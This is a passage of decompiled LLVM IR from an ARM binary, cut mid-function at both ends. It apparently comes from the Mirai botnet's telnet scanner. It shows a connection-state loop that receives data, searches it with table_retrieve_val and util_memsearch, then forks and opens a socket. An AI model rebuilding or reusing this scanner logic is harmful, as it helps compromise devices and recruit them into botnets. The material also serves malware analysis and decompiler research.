  store i8 %v1_f3b0, i8* %v2_f3a0, align 1
  %v0_f3b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f3b4, label %.thread74, label %dec_label_pc_f3c4

.thread74:                                        ; preds = %dec_label_pc_f3a0
  %v1_f3b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f3b4 = add i32 %v1_f3b4, -10
  store i32 %v2_f3b4, i32* %r3.global-to-local, align 4
  %v2_f3b8 = load i32, i32* @r4, align 4
  %v3_f3b8 = add i32 %v2_f3b8, 12
  %v4_f3b8 = inttoptr i32 %v3_f3b8 to i32*
  store i32 %v2_f3b4, i32* %v4_f3b8, align 4
  %v1_f3bc = load i32, i32* %r3.global-to-local, align 4
  %v2_f3bc = trunc i32 %v1_f3bc to i8
  %v3_f3bc = load i32, i32* @r4, align 4
  %v4_f3bc = add i32 %v3_f3bc, 284
  %v5_f3bc = inttoptr i32 %v4_f3bc to i8*
  store i8 %v2_f3bc, i8* %v5_f3bc, align 1
  %v0_f3c0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f3c0.pr.pr, label %bb411, label %dec_label_pc_f3c4

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f3a0, %.thread74
  %v0_f3c4 = load i32, i32* @r4, align 4
  store i32 %v0_f3c4, i32* @r0, align 4
  %v0_f3c8 = call i32 @setup_connection()
  store i32 %v0_f3c8, i32* %r0.global-to-local, align 4
  br label %bb411

dec_label_pc_f3d0:                                ; preds = %dec_label_pc_f2e4
  store i32 %v3_f3d0, i32* %r0.global-to-local, align 4
  %v3_f3d4 = udiv i32 %v3_f3d0, 32
  %v3_f3d8 = mul nuw nsw i32 %v3_f3d4, 4
  store i32 %v2_f3dc, i32* @lr, align 4
  %v2_f3e0 = add i32 %v3_f3d8, %v2_f3dc
  store i32 %v2_f3e0, i32* %r3.global-to-local, align 4
  %v1_f3e4 = add i32 %v2_f3e0, -312
  %v2_f3e4 = inttoptr i32 %v1_f3e4 to i32*
  %v3_f3e4 = load i32, i32* %v2_f3e4, align 4
  %v1_f3e8 = urem i32 %v3_f3d0, 32
  store i32 %v1_f3e8, i32* %r1.global-to-local, align 4
  %v7_f3ec = shl i32 1, %v1_f3e8
  %v8_f3ec = or i32 %v3_f3e4, %v7_f3ec
  store i32 %v8_f3ec, i32* %r2.global-to-local, align 4
  %v0_f3f0 = load i32, i32* @r5, align 4
  %v3_f3f0 = icmp uge i32 %v0_f3f0, %v3_f3d0
  store i1 %v3_f3f0, i1* %cpsr_c.global-to-local, align 1
  %v9_f3f0 = icmp eq i32 %v0_f3f0, %v3_f3d0
  store i1 %v9_f3f0, i1* %cpsr_z.global-to-local, align 1
  %v5_f3f4 = icmp slt i32 %v0_f3f0, %v3_f3d0
  br i1 %v5_f3f4, label %bb418, label %bb419

bb418:                                            ; preds = %dec_label_pc_f3d0
  store i32 %v3_f3d0, i32* @r5, align 4
  br label %bb419

bb419:                                            ; preds = %dec_label_pc_f3d0, %bb418
  store i32 %v8_f3ec, i32* %v2_f3e4, align 4
  br label %bb411

dec_label_pc_f400:                                ; preds = %bb411
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_f40c = load i32, i32* @r6, align 4
  %v1_f40c = load i32, i32* @r5, align 4
  %v3_f40c = icmp uge i32 %v0_f40c, %v1_f40c
  store i1 %v3_f40c, i1* %cpsr_c.global-to-local, align 1
  %v9_f40c = icmp eq i32 %v0_f40c, %v1_f40c
  store i1 %v9_f40c, i1* %cpsr_z.global-to-local, align 1
  %v5_f410 = icmp slt i32 %v0_f40c, %v1_f40c
  %storemerge157 = select i1 %v5_f410, i32 %v1_f40c, i32 %v0_f40c
  store i32 %v2_f424, i32* %ip.global-to-local, align 4
  store i32 %v2_f428, i32* %r1.global-to-local, align 4
  store i32 %v2_f42c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f434 = add i32 %storemerge157, 1
  store i32 %v1_f434, i32* %r0.global-to-local, align 4
  %v5_f440 = call i32 @__libc_select(i32 %v1_f434, i32 %v2_f428, i32 %v2_f42c, i32 0, i32 %v2_f424)
  %v0_f444 = load i32, i32* @r4, align 4
  store i32 %v0_f444, i32* %r0.global-to-local, align 4
  %v1_f448 = inttoptr i32 %v0_f444 to i32*
  %v2_f448 = call i32 @__GI_time(i32* %v1_f448)
  store i32 %v2_f448, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22284.140 to i32), i32* @lr, align 4
  %v0_f450 = load i32, i32* @r4, align 4
  store i32 %v0_f450, i32* %stack_var_-52, align 4
  store i32 %v2_f448, i32* @global_var_22284.140, align 4
  br label %dec_label_pc_f458

dec_label_pc_f458:                                ; preds = %dec_label_pc_f5c8, %dec_label_pc_f400
  %v0_f464 = phi i32 [ %v1_f5cc, %dec_label_pc_f5c8 ], [ %v0_f450, %dec_label_pc_f400 ]
  store i32 ptrtoint (i32* @global_var_24d68.152 to i32), i32* %r0.global-to-local, align 4
  %v3_f45c = mul i32 %v0_f464, 256
  store i32 %v3_f45c, i32* %r3.global-to-local, align 4
  %v2_f460 = load i32, i32* @global_var_24d68.152, align 4
  store i32 %v2_f460, i32* %r1.global-to-local, align 4
  %v2_f468 = mul i32 %v0_f464, 288
  store i32 %v2_f468, i32* %r2.global-to-local, align 4
  %v2_f46c = add i32 %v2_f460, %v2_f468
  store i32 %v2_f46c, i32* @r6, align 4
  %v1_f470 = add i32 %v2_f46c, 4
  %v2_f470 = inttoptr i32 %v1_f470 to i32*
  %v3_f470 = load i32, i32* %v2_f470, align 4
  store i32 %v3_f470, i32* %r0.global-to-local, align 4
  %v2_f474 = icmp eq i32 %v3_f470, -1
  store i1 %v2_f474, i1* %cpsr_c.global-to-local, align 1
  %v7_f474 = icmp eq i32 %v3_f470, -1
  store i1 %v7_f474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f474, label %dec_label_pc_f5c8, label %dec_label_pc_f47c

dec_label_pc_f47c:                                ; preds = %dec_label_pc_f458
  %v3_f47c = udiv i32 %v3_f470, 32
  store i32 %v2_f3dc, i32* %r1.global-to-local, align 4
  %v3_f484 = mul nuw nsw i32 %v3_f47c, 4
  store i32 %v3_f484, i32* @ip, align 4
  %v2_f488 = add i32 %v3_f484, %v2_f3dc
  store i32 %v2_f488, i32* %r2.global-to-local, align 4
  %v1_f48c = add i32 %v2_f488, -312
  %v2_f48c = inttoptr i32 %v1_f48c to i32*
  %v3_f48c = load i32, i32* %v2_f48c, align 4
  %v1_f490 = urem i32 %v3_f470, 32
  store i32 %v1_f490, i32* %r1.global-to-local, align 4
  %v2_f494 = add nsw i32 %v1_f490, -1
  %v3_f494 = shl i32 1, %v2_f494
  %v4_f494 = and i32 %v3_f48c, %v3_f494
  %v5_f494 = icmp ne i32 %v4_f494, 0
  store i1 %v5_f494, i1* %cpsr_c.global-to-local, align 1
  %v6_f494 = ashr i32 %v3_f48c, %v1_f490
  store i32 %v6_f494, i32* %r3.global-to-local, align 4
  %v1_f498 = urem i32 %v6_f494, 2
  %v2_f498 = icmp eq i32 %v1_f498, 0
  store i1 %v2_f498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f498, label %dec_label_pc_f4a0, label %dec_label_pc_1003c

dec_label_pc_f4a0:                                ; preds = %dec_label_pc_f47c, %dec_label_pc_100e0
  %v1_f4ac = phi i32 [ %v1_f490, %dec_label_pc_f47c ], [ %v1_f4ac.pre, %dec_label_pc_100e0 ]
  %v0_f4a4 = phi i32 [ %v3_f484, %dec_label_pc_f47c ], [ %v0_f4a4.pre, %dec_label_pc_100e0 ]
  store i32 %v2_f3dc, i32* @lr, align 4
  %v2_f4a4 = add i32 %v0_f4a4, %v2_f3dc
  store i32 %v2_f4a4, i32* %r2.global-to-local, align 4
  %v1_f4a8 = add i32 %v2_f4a4, -184
  %v2_f4a8 = inttoptr i32 %v1_f4a8 to i32*
  %v3_f4a8 = load i32, i32* %v2_f4a8, align 4
  %v2_f4ac = add i32 %v1_f4ac, -1
  %v3_f4ac = shl i32 1, %v2_f4ac
  %v4_f4ac = and i32 %v3_f4a8, %v3_f4ac
  %v5_f4ac = icmp ne i32 %v4_f4ac, 0
  store i1 %v5_f4ac, i1* %cpsr_c.global-to-local, align 1
  %v6_f4ac = ashr i32 %v3_f4a8, %v1_f4ac
  store i32 %v6_f4ac, i32* %r3.global-to-local, align 4
  %v1_f4b0 = urem i32 %v6_f4ac, 2
  %v2_f4b0 = icmp eq i32 %v1_f4b0, 0
  store i1 %v2_f4b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4b0, label %dec_label_pc_f5c8, label %dec_label_pc_f4b8.preheader

dec_label_pc_f4b8.preheader:                      ; preds = %dec_label_pc_f4a0
  %v0_f4b8182 = load i32, i32* @r6, align 4
  %v1_f4b8183 = add i32 %v0_f4b8182, 12
  %v2_f4b8184 = inttoptr i32 %v1_f4b8183 to i32*
  %v3_f4b8185 = load i32, i32* %v2_f4b8184, align 4
  store i32 %v3_f4b8185, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4bc181187 = icmp eq i32 %v3_f4b8185, 0
  store i1 %v2_f4bc181187, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4bc181187, label %dec_label_pc_f5c8, label %dec_label_pc_f4c4.lr.ph

dec_label_pc_f4b8.loopexit:                       ; preds = %dec_label_pc_f618, %dec_label_pc_f724
  %v0_f4b8 = load i32, i32* @r6, align 4
  %v1_f4b8 = add i32 %v0_f4b8, 12
  %v2_f4b8 = inttoptr i32 %v1_f4b8 to i32*
  %v3_f4b8 = load i32, i32* %v2_f4b8, align 4
  store i32 %v3_f4b8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4bc181 = icmp eq i32 %v3_f4b8, 0
  store i1 %v2_f4bc181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4bc181, label %dec_label_pc_f5c8, label %dec_label_pc_f4c4.lr.ph

dec_label_pc_f4c4.lr.ph:                          ; preds = %dec_label_pc_f4b8.preheader, %dec_label_pc_f4b8.loopexit
  %v0_f4c4235 = phi i32 [ %v0_f4b8, %dec_label_pc_f4b8.loopexit ], [ %v0_f4b8182, %dec_label_pc_f4b8.preheader ]
  br label %dec_label_pc_f4c4

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f4bc.backedge.thread, %dec_label_pc_f4bc.backedge, %dec_label_pc_f4bc.backedge.thread565, %dec_label_pc_f4c4.lr.ph
  %v0_10008 = phi i32 [ %v0_f4c4235, %dec_label_pc_f4c4.lr.ph ], [ %v0_f4c4232, %dec_label_pc_f4bc.backedge ], [ %v0_f53c, %dec_label_pc_f4bc.backedge.thread ], [ %v0_f53c, %dec_label_pc_f4bc.backedge.thread565 ]
  %v1_f4c4 = add i32 %v0_10008, 24
  %v2_f4c4 = inttoptr i32 %v1_f4c4 to i32*
  %v3_f4c4 = load i32, i32* %v2_f4c4, align 4
  store i32 %v3_f4c4, i32* @r3, align 4
  %v2_f4c8 = icmp ugt i32 %v3_f4c4, 255
  store i1 %v2_f4c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4c8 = icmp eq i32 %v3_f4c4, 256
  store i1 %v7_f4c8, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_10008, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_f4c8, label %dec_label_pc_10008, label %dec_label_pc_f4d4

dec_label_pc_f4d4:                                ; preds = %dec_label_pc_f4c4, %dec_label_pc_10008
  store i32 %v0_f0e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_f104, align 4
  %v0_f4e0 = load i32, i32* @r6, align 4
  %v1_f4e0 = add i32 %v0_f4e0, 24
  %v2_f4e0 = inttoptr i32 %v1_f4e0 to i32*
  %v3_f4e0 = load i32, i32* %v2_f4e0, align 4
  store i32 %v3_f4e0, i32* %r2.global-to-local, align 4
  %v0_f4e4 = load i32, i32* @fp, align 4
  %v2_f4e4 = add i32 %v0_f4e4, %v3_f4e0
  store i32 %v2_f4e4, i32* @r4, align 4
  %v1_f4e8 = add i32 %v0_f4e0, 4
  %v2_f4e8 = inttoptr i32 %v1_f4e8 to i32*
  %v3_f4e8 = load i32, i32* %v2_f4e8, align 4
  store i32 %v3_f4e8, i32* %r0.global-to-local, align 4
  %v1_f4ec = sub i32 256, %v3_f4e0
  store i32 %v1_f4ec, i32* %r2.global-to-local, align 4
  store i32 %v2_f4e4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f4f8 = call i32 @__libc_recv(i32 %v3_f4e8, i32 %v2_f4e4, i32 %v1_f4ec, i32 16384)
  store i32 %v4_f4f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4fc = icmp eq i32 %v4_f4f8, 0
  store i1 %v2_f4fc, i1* %cpsr_z.global-to-local, align 1
  %tmp420 = icmp slt i32 %v4_f4f8, 1
  br i1 %tmp420, label %dec_label_pc_f574, label %dec_label_pc_f504

dec_label_pc_f504:                                ; preds = %dec_label_pc_f4d4
  %v0_f504 = load i32, i32* @r5, align 4
  store i32 %v0_f504, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f508

dec_label_pc_f508:                                ; preds = %.thread81, %dec_label_pc_f504
  %v3_f514 = phi i32 [ %v1_f518, %.thread81 ], [ %v0_f504, %dec_label_pc_f504 ]
  %v1_f508 = load i32, i32* @r4, align 4
  %v2_f508 = add i32 %v1_f508, %v3_f514
  %v3_f508 = inttoptr i32 %v2_f508 to i8*
  %v4_f508 = load i8, i8* %v3_f508, align 1
  %v6_f508 = zext i8 %v4_f508 to i32
  store i32 %v6_f508, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f50c = icmp eq i8 %v4_f508, 0
  store i1 %v2_f50c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f50c, label %bb421, label %.thread81

bb421:                                            ; preds = %dec_label_pc_f508
  %v2_f510 = add nuw nsw i32 %v6_f508, 65
  store i32 %v2_f510, i32* %r3.global-to-local, align 4
  %v2_f514 = trunc i32 %v2_f510 to i8
  store i8 %v2_f514, i8* %v3_f508, align 1
  %v0_f518.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread81

.thread81:                                        ; preds = %dec_label_pc_f508, %bb421
  %v0_f518 = phi i32 [ %v3_f514, %dec_label_pc_f508 ], [ %v0_f518.pre, %bb421 ]
  %v1_f518 = add i32 %v0_f518, 1
  store i32 %v1_f518, i32* %r2.global-to-local, align 4
  %v3_f51c = icmp uge i32 %v1_f518, %v4_f4f8
  store i1 %v3_f51c, i1* %cpsr_c.global-to-local, align 1
  %v9_f51c = icmp eq i32 %v1_f518, %v4_f4f8
  store i1 %v9_f51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f51c, label %dec_label_pc_f524, label %dec_label_pc_f508

dec_label_pc_f524:                                ; preds = %.thread81, %dec_label_pc_f578
  store i32 ptrtoint (i32* @global_var_22284.140 to i32), i32* @ip, align 4
  %v0_f528 = load i32, i32* @r6, align 4
  %v1_f528 = add i32 %v0_f528, 24
  %v2_f528 = inttoptr i32 %v1_f528 to i32*
  %v3_f528 = load i32, i32* %v2_f528, align 4
  %v2_f52c = load i32, i32* @global_var_22284.140, align 4
  store i32 %v2_f52c, i32* %r2.global-to-local, align 4
  %v2_f530 = add i32 %v3_f528, %v4_f4f8
  store i32 %v2_f530, i32* %r3.global-to-local, align 4
  store i32 %v2_f530, i32* %v2_f528, align 4
  %v0_f538 = load i32, i32* %r2.global-to-local, align 4
  %v1_f538 = load i32, i32* @r6, align 4
  %v2_f538 = add i32 %v1_f538, 8
  %v3_f538 = inttoptr i32 %v2_f538 to i32*
  store i32 %v0_f538, i32* %v3_f538, align 4
  br label %dec_label_pc_f53c

dec_label_pc_f53c:                                ; preds = %dec_label_pc_f72c, %dec_label_pc_f524
  %v0_f53c = load i32, i32* @r6, align 4
  %v1_f53c = add i32 %v0_f53c, 12
  %v2_f53c = inttoptr i32 %v1_f53c to i32*
  %v3_f53c = load i32, i32* %v2_f53c, align 4
  store i32 %v3_f53c, i32* %r0.global-to-local, align 4
  %v1_f540 = add i32 %v3_f53c, -2
  store i32 %v1_f540, i32* @r3, align 4
  %v7_f544 = icmp eq i32 %v1_f540, 8
  store i1 %v7_f544, i1* %cpsr_z.global-to-local, align 1
  %v5_f548 = and i32 %v1_f540, 1073741824
  %v6_f548 = icmp ne i32 %v5_f548, 0
  store i1 %v6_f548, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_f53c, label %dec_label_pc_f4bc.backedge [
    i32 2, label %dec_label_pc_f828
    i32 3, label %dec_label_pc_fdb0
    i32 4, label %dec_label_pc_fbf0
    i32 5, label %dec_label_pc_f9cc
    i32 6, label %dec_label_pc_f8f8
    i32 7, label %dec_label_pc_fcdc
    i32 8, label %dec_label_pc_fb1c
    i32 9, label %dec_label_pc_f754
    i32 10, label %dec_label_pc_f5e0
  ]

dec_label_pc_f574:                                ; preds = %dec_label_pc_f4d4
  br i1 %v2_f4fc, label %dec_label_pc_10264, label %dec_label_pc_f578

dec_label_pc_f578:                                ; preds = %dec_label_pc_f574
  %v3_f578 = icmp eq i32 %v4_f4f8, -1
  store i1 %v3_f578, i1* %cpsr_c.global-to-local, align 1
  %v8_f578 = icmp eq i32 %v4_f4f8, -1
  store i1 %v8_f578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f578, label %dec_label_pc_f580, label %dec_label_pc_f524

dec_label_pc_f580:                                ; preds = %dec_label_pc_f578
  store i32 %v0_f0e8, i32* %r2.global-to-local, align 4
  %v2_f584 = load i32, i32* %v2_f104, align 4
  store i32 %v2_f584, i32* %r3.global-to-local, align 4
  %v2_f588 = icmp ugt i32 %v2_f584, 10
  store i1 %v2_f588, i1* %cpsr_c.global-to-local, align 1
  %v7_f588 = icmp eq i32 %v2_f584, 11
  store i1 %v7_f588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f588, label %dec_label_pc_f5c8, label %dec_label_pc_f590

dec_label_pc_f590:                                ; preds = %dec_label_pc_f580, %dec_label_pc_10264
  %v0_f590 = load i32, i32* @r6, align 4
  %v1_f590 = add i32 %v0_f590, 4
  %v2_f590 = inttoptr i32 %v1_f590 to i32*
  %v3_f590 = load i32, i32* %v2_f590, align 4
  store i32 %v3_f590, i32* %r0.global-to-local, align 4
  %v1_f594 = call i32 @__GI___libc_close(i32 %v3_f590)
  store i32 %v1_f594, i32* %r0.global-to-local, align 4
  %v0_f598 = load i32, i32* @r6, align 4
  %v1_f598 = add i32 %v0_f598, 284
  %v2_f598 = inttoptr i32 %v1_f598 to i8*
  %v3_f598 = load i8, i8* %v2_f598, align 1
  %v4_f598 = zext i8 %v3_f598 to i32
  %v1_f59c = add nuw nsw i32 %v4_f598, 1
  %v1_f5a0 = urem i32 %v1_f59c, 256
  store i32 %v1_f5a0, i32* %r3.global-to-local, align 4
  %v2_f5a4 = icmp ugt i32 %v1_f5a0, 8
  store i1 %v2_f5a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5a4 = icmp eq i32 %v1_f5a0, 9
  store i1 %v7_f5a4, i1* %cpsr_z.global-to-local, align 1
  %v1_f5a8 = trunc i32 %v1_f59c to i8
  store i8 %v1_f5a8, i8* %v2_f598, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f5b0 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f5b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f5b0 = xor i1 %v1_f5b0, true
  %v3_f5b0 = and i1 %v0_f5b0, %v2_f5b0
  br i1 %v3_f5b0, label %bb422, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f590
  %v1_f5b4309314 = load i32, i32* @r6, align 4
  %v2_f5b4310315 = add i32 %v1_f5b4309314, 4
  %v3_f5b4311316 = inttoptr i32 %v2_f5b4310315 to i32*
  store i32 -1, i32* %v3_f5b4311316, align 4
  br label %bb423

bb422:                                            ; preds = %dec_label_pc_f590
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f5b4305 = load i32, i32* @r6, align 4
  %v2_f5b4306 = add i32 %v1_f5b4305, 4
  %v3_f5b4307 = inttoptr i32 %v2_f5b4306 to i32*
  store i32 -1, i32* %v3_f5b4307, align 4
  %v4_f5b8 = load i32, i32* %r3.global-to-local, align 4
  %v5_f5b8 = load i32, i32* @r6, align 4
  %v6_f5b8 = add i32 %v5_f5b8, 12
  %v7_f5b8 = inttoptr i32 %v6_f5b8 to i32*
  store i32 %v4_f5b8, i32* %v7_f5b8, align 4
  %v4_f5bc = load i32, i32* %r3.global-to-local, align 4
  %v5_f5bc = trunc i32 %v4_f5bc to i8
  %v6_f5bc = load i32, i32* @r6, align 4
  %v7_f5bc = add i32 %v6_f5bc, 284
  %v8_f5bc = inttoptr i32 %v7_f5bc to i8*
  store i8 %v5_f5bc, i8* %v8_f5bc, align 1
  %v0_f5c0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f5c0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb423

bb423:                                            ; preds = %.thread313, %bb422
  %v1_f5c4 = phi i1 [ %v1_f5c0.pre, %bb422 ], [ %v0_f5b0, %.thread313 ]
  %v0_f5c4 = phi i1 [ %v0_f5c0.pre, %bb422 ], [ %v1_f5b0, %.thread313 ]
  %v2_f5c0 = xor i1 %v1_f5c4, true
  %v3_f5c0 = or i1 %v0_f5c4, %v2_f5c0
  br i1 %v3_f5c0, label %bb424, label %bb425

bb424:                                            ; preds = %bb423
  %v4_f5c0 = load i32, i32* @r6, align 4
  store i32 %v4_f5c0, i32* %r0.global-to-local, align 4
  br label %bb425

bb425:                                            ; preds = %bb423, %bb424
  store i32 62920, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f5c0, i32 ptrtoint (i32* @global_var_e8a8.204 to i32))
  br label %dec_label_pc_f5c8

dec_label_pc_f5c8:                                ; preds = %dec_label_pc_f4b8.loopexit, %dec_label_pc_f4bc.backedge, %dec_label_pc_f4b8.preheader, %dec_label_pc_f580, %dec_label_pc_f4a0, %dec_label_pc_f458, %dec_label_pc_10100, %bb425
  %v3_f5c8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f5c8, i32* %r3.global-to-local, align 4
  %v1_f5cc = add i32 %v3_f5c8, 1
  store i32 %v1_f5cc, i32* @r4, align 4
  %v2_f5d0 = icmp ugt i32 %v1_f5cc, 254
  store i1 %v2_f5d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5d0 = icmp eq i32 %v1_f5cc, 255
  store i1 %v7_f5d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f5cc, i32* %stack_var_-52, align 4
  %v7_f5d8 = icmp slt i32 %v1_f5cc, 256
  br i1 %v7_f5d8, label %dec_label_pc_f458, label %dec_label_pc_edd4

dec_label_pc_f5e0:                                ; preds = %dec_label_pc_f53c
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f5e4 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_f5f4 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_f5f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f5f4, i32* %r2.global-to-local, align 4
  %v1_f600 = add i32 %v3_f5f8, -1
  store i32 %v1_f600, i32* %r3.global-to-local, align 4
  %v0_f604 = load i32, i32* @fp, align 4
  store i32 %v0_f604, i32* %r0.global-to-local, align 4
  %v0_f608 = load i32, i32* @r6, align 4
  %v1_f608 = add i32 %v0_f608, 24
  %v2_f608 = inttoptr i32 %v1_f608 to i32*
  %v3_f608 = load i32, i32* %v2_f608, align 4
  store i32 %v3_f608, i32* %r1.global-to-local, align 4
  %v4_f60c = call i32 @util_memsearch(i32 %v0_f604, i32 %v3_f608, i32 %v3_f5f4, i32 %v1_f600)
  %v3_f610 = icmp eq i32 %v4_f60c, -1
  store i1 %v3_f610, i1* %cpsr_c.global-to-local, align 1
  %v8_f610 = icmp eq i32 %v4_f60c, -1
  store i1 %v8_f610, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f61c = call i32 @table_lock_val(i32 10)
  br i1 %v3_f610, label %dec_label_pc_f618, label %dec_label_pc_ffa0

dec_label_pc_f618:                                ; preds = %dec_label_pc_f5e0
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f624 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f634 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f634, i32* %r0.global-to-local, align 4
  %v3_f638 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f634, i32* %r2.global-to-local, align 4
  %v1_f640 = add i32 %v3_f638, -1
  store i32 %v1_f640, i32* %r3.global-to-local, align 4
  %v0_f644 = load i32, i32* @r6, align 4
  %v1_f644 = add i32 %v0_f644, 24
  %v2_f644 = inttoptr i32 %v1_f644 to i32*
  %v3_f644 = load i32, i32* %v2_f644, align 4
  store i32 %v3_f644, i32* %r1.global-to-local, align 4
  %v0_f648 = load i32, i32* @fp, align 4
  store i32 %v0_f648, i32* %r0.global-to-local, align 4
  %v4_f64c = call i32 @util_memsearch(i32 %v0_f648, i32 %v3_f644, i32 %v3_f634, i32 %v1_f640)
  store i32 %v4_f64c, i32* @r8, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f658 = call i32 @table_lock_val(i32 9)
  store i32 %v1_f658, i32* %r0.global-to-local, align 4
  %v0_f65c = load i32, i32* @r8, align 4
  %v2_f65c = icmp eq i32 %v0_f65c, -1
  store i1 %v2_f65c, i1* %cpsr_c.global-to-local, align 1
  %v7_f65c = icmp eq i32 %v0_f65c, -1
  store i1 %v7_f65c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f65c, label %dec_label_pc_f4b8.loopexit, label %dec_label_pc_f664

dec_label_pc_f664:                                ; preds = %dec_label_pc_f618
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f664 = icmp eq i32 %v0_f65c, 0
  store i1 %v2_f664, i1* %cpsr_z.global-to-local, align 1
  %tmp426 = icmp slt i32 %v0_f65c, 1
  br i1 %tmp426, label %dec_label_pc_f724, label %dec_label_pc_f66c

dec_label_pc_f66c:                                ; preds = %dec_label_pc_f664
  %v0_f66c = load i32, i32* @r6, align 4
  %v1_f66c = add i32 %v0_f66c, 20
  %v2_f66c = inttoptr i32 %v1_f66c to i16*
  %v3_f66c = load i16, i16* %v2_f66c, align 2
  %v4_f66c = zext i16 %v3_f66c to i32
  store i32 %v4_f66c, i32* %r3.global-to-local, align 4
  %v1_f670 = add i32 %v0_f66c, 16
  %v2_f670 = inttoptr i32 %v1_f670 to i32*
  %v3_f670 = load i32, i32* %v2_f670, align 4
  store i32 %v3_f670, i32* %r2.global-to-local, align 4
  store i32 %v2_f674, i32* @lr, align 4
  store i32 %v4_f66c, i32* %stack_var_-42, align 4
  store i32 %v3_f670, i32* %stack_var_-60, align 4
  %v1_f680 = inttoptr i32 %v0_f66c to i32*
  %v2_f680 = load i32, i32* %v1_f680, align 4
  store i32 %v2_f680, i32* @sb, align 4
  %v0_f684 = call i32 @__libc_fork()
  store i32 %v0_f684, i32* %r0.global-to-local, align 4
  %v7_f688 = icmp eq i32 %v0_f684, -1
  %.465 = zext i1 %v7_f688 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f694 = icmp eq i32 %v0_f684, 0
  store i1 %v2_f694, i1* %cpsr_z.global-to-local, align 1
  %tmp429 = icmp slt i32 %v0_f684, 1
  br i1 %tmp429, label %bb430, label %.thread84

.thread84:                                        ; preds = %dec_label_pc_f66c
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f70c

bb430:                                            ; preds = %dec_label_pc_f66c
  store i32 %.465, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6a0 = icmp eq i1 %v7_f688, false
  store i1 %v2_f6a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6a0, label %dec_label_pc_f6a8, label %dec_label_pc_f70c

dec_label_pc_f6a8:                                ; preds = %bb430
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f6b4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f6b4, i32* %r0.global-to-local, align 4
  %v2_f6b8 = icmp eq i32 %v3_f6b4, -1
  store i1 %v2_f6b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6b8 = icmp eq i32 %v3_f6b4, -1
  store i1 %v7_f6b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f6b4, i32* @r5, align 4
  br i1 %v7_f6b8, label %dec_label_pc_10234, label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f6a8
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f6c8 = call i32 @table_unlock_val(i32 2)
